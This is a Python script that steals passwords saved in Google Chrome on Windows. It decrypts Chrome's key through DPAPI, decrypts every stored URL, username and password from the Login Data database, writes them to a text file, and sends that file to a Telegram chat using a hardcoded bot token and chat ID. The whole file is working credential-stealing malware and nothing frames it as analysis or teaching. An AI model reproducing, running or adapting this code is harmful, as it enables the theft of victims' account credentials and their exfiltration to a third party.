import sys
# Add the directory where 'requests' is located
sys.path.insert(0, r'C:\\Python\\Lib\\site-packages')

import sqlite3
import os
import json
import base64
import shutil
from Crypto.Cipher import AES
import telegram
import asyncio
import subprocess
import ctypes

# Telegram Bot Configurations
BOT_TOKEN = '7866483331:AAFLe0iNc5VrdZkrByBrDGfr4asHeZi2O9Q'
CHAT_ID = '2044432474'


def get_chrome_encryption_key():
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], "Google\\Chrome\\User Data\\Local State")
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.load(file)

    # Extract the encrypted key and remove the DPAPI prefix
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    
    # Use DPAPI via ctypes to decrypt the encryption key
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_uint),
                    ("pbData", ctypes.POINTER(ctypes.c_byte))]

    # Prepare the encrypted key in a DATA_BLOB structure
    encrypted_key_blob = DATA_BLOB(len(encrypted_key), ctypes.cast(ctypes.create_string_buffer(encrypted_key), ctypes.POINTER(ctypes.c_byte)))
    decrypted_key_blob = DATA_BLOB()

    # Call CryptUnprotectData
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(encrypted_key_blob), None, None, None, None, 0, ctypes.byref(decrypted_key_blob)):
        # Retrieve the decrypted key
        decrypted_key = ctypes.string_at(decrypted_key_blob.pbData, decrypted_key_blob.cbData)
        ctypes.windll.kernel32.LocalFree(decrypted_key_blob.pbData)  # Free memory
        return decrypted_key
    else:
        raise Exception("Failed to retrieve the decryption key.")


# Decrypt the saved password using AES
def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(password)[:-16].decode()
        return decrypted_password
    except Exception as e:
        print(f"Failed to decrypt password: {e}")
        return "Unable to decrypt"

# Function to extract saved passwords from Chrome's database
def get_saved_passwords():
    db_path = os.path.join(os.environ['LOCALAPPDATA'], "Google\\Chrome\\User Data\\default\\Login Data")
    filename = "ChromePasswords.db"
    output_file = "saved_passwords.txt"
    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    key = get_chrome_encryption_key()
    
    with open(output_file, 'w') as file:
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            decrypted_password = decrypt_password(encrypted_password, key)
            file.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")
            print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}")
    
    cursor.close()
    db.close()
    os.remove(filename)
    return output_file

# Asynchronously send file to Telegram
async def send_file_to_telegram(token, chat_id, file_path):
    bot = telegram.Bot(token=token)
    with open(file_path, 'rb') as file:
        await bot.send_document(chat_id=chat_id, document=file)
    print("File sent to Telegram.")

# Main function to retrieve passwords and send file
if __name__ == "__main__":
    output_file = get_saved_passwords()
    asyncio.run(send_file_to_telegram(BOT_TOKEN, CHAT_ID, output_file))
